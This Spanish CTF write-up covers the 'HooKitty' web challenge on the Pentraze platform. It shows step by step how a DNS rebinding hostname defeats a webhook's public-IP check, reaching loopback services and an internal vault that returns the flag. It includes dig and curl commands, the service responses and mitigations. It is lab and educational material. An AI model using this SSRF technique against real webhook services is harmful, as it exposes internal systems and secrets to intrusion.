---
tipo: laboratorio
tags: [ctf, pentraze, web, easy]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Easy"
Estado: "Completado"
Puntos: "50"
Flag: "PENTRAZE{0232a2d8817f4df06a5e68201bfd537f9bdd3308acb22c41b14277d81757f74e}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Easy|Easy]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 50

# Writeup - HooKitty

> [!info] Objetivo
> Obtener la flag mediante una vulnerabilidad de DNS Rebinding / TOCTOU sobre el registro de webhooks.

- **Target:** `http://34.135.253.132:33895`
- **Autor:** `@P1Gr3c0`
- **Categoría:** Web
- **Dificultad de la clasificación final:** Easy

## Resumen rápido de la cadena de ataque

1. HooKitty valida que el dominio del webhook resuelva a una IP pública.
2. Después vuelve a resolverlo y entrega el POST a la segunda dirección.
3. Un dominio de DNS rebinding alterna entre `1.1.1.1` y `127.0.0.1`.
4. La validación pasa con la IP pública, pero la entrega llega al puerto loopback `8081`.
5. El endpoint de estado del worker divulga `127.0.0.1:1337`, donde está el vault.
6. Un POST al vault devuelve la rotación de producción y la flag.

## Vulnerabilidades explotadas

- **[[DNS Rebinding]]** por cambiar la respuesta DNS entre check y uso.
- **[[TOCTOU]] (Time-of-Check to Time-of-Use):** dos resoluciones no son una validación atómica.
- **[[SSRF]] contra servicios loopback** mediante webhooks controlados por el usuario.
- **Egress sin segmentación:** el servidor podía acceder a `127.0.0.1` y puertos internos.
- **Divulgación de topología interna** en la respuesta del worker.

## Paso a paso técnico

### 1. Confirmar la doble resolución

Se utilizó el hostname de prueba:

```text
make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms
```

Este hostname puede alternar entre:

```text
1.1.1.1
127.0.0.1
```

La comprobación se hizo con:

```bash
dig +noall +answer A \
  make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms @8.8.8.8
```

La secuencia problemática era:

```text
Resolución #1: 1.1.1.1 → validación pública
Resolución #2: 127.0.0.1 → petición interna
```

### 2. Encontrar el servicio interno

Se registraron webhooks con el hostname alternante y se probaron puertos. El puerto `8080` devolvió:

```json
{"error":"not_found"}
```

El puerto `8081` devolvió:

```json
{
  "service": "hookrelay-worker-admin",
  "links": ["/api/worker/health", "/api/worker/status"]
}
```

### 3. Enumerar el worker

`/api/worker/status` devolvió un mapa de servicios:

```json
{
  "worker": "hookrelay-worker-3",
  "state": "idle",
  "endpoints": [
    {"name": "metrics", "loopback": "127.0.0.1:7000"},
    {"name": "worker_admin", "loopback": "127.0.0.1:8081"},
    {"name": "banner", "loopback": "127.0.0.1:9000"},
    {"name": "vault", "loopback": "127.0.0.1:1337"}
  ]
}
```

El `rotation_key` visible en el worker era `NOT_THE_FLAG`; el objetivo real era el vault del puerto `1337`.

### 4. Entregar el evento al vault

```bash
curl -s -X POST 'http://34.135.253.132:33895/api/webhooks' \
  -H 'Content-Type: application/json' \
  --data '{"name":"rebind-vault","url":"http://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms:1337/"}'
```

El servicio interno respondió:

```json
{
  "service": "hookrelay-internal-vault",
  "accepted_event": "contact.created",
  "read_only": true,
  "secret_name": "production/rotation-key",
  "rotation_key": "PENTRAZE{0232a2d8817f4df06a5e68201bfd537f9bdd3308acb22c41b14277d81757f74e}"
}
```

La respuesta del endpoint público también mostraba `verified_address: 1.1.1.1`, pero la entrega se dirigía a `127.0.0.1:1337`, lo que demostraba el rebinding.

## Flag

```text
PENTRAZE{0232a2d8817f4df06a5e68201bfd537f9bdd3308acb22c41b14277d81757f74e}
```

## Lecciones aprendidas y mitigar

- Resolver una vez, validar la dirección y conectar exactamente a esa misma IP; no validar un hostname y resolverlo de nuevo después.
- Bloquear `127.0.0.0/8`, loopback IPv4/IPv6, `RFC1918`, link-local, multicast y rangos reservados en cada conexión.
- Revalidar la dirección efectiva justo antes de conectar, pero sin cambiar el destino entre la validación y el uso.
- No seguir redirecciones hacia rangos internos.
- Aplicar egress filtering, proxies de salida y segmentación de red para impedir que un webhook alcance loopback.
- Autenticar los servicios internos y separar la red de entrega de la red de gestión.
- Tratar la respuesta de un worker como información sensible y no exponer endpoints administrativos a un atacante que controle el destino.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - SoftDat Technology|SoftDat Technology]]
- ➡️ Siguiente: [[Writeup - Escaperoom|Escaperoom]]

## Relacionadas

- [[DNS]] — resolución, cachés y validación de destinos.
- [[SSRF]] — superficie de petición desde servidor.
- [[Network Segmentation]] — defensa complementaria contra el acceso a loopback.
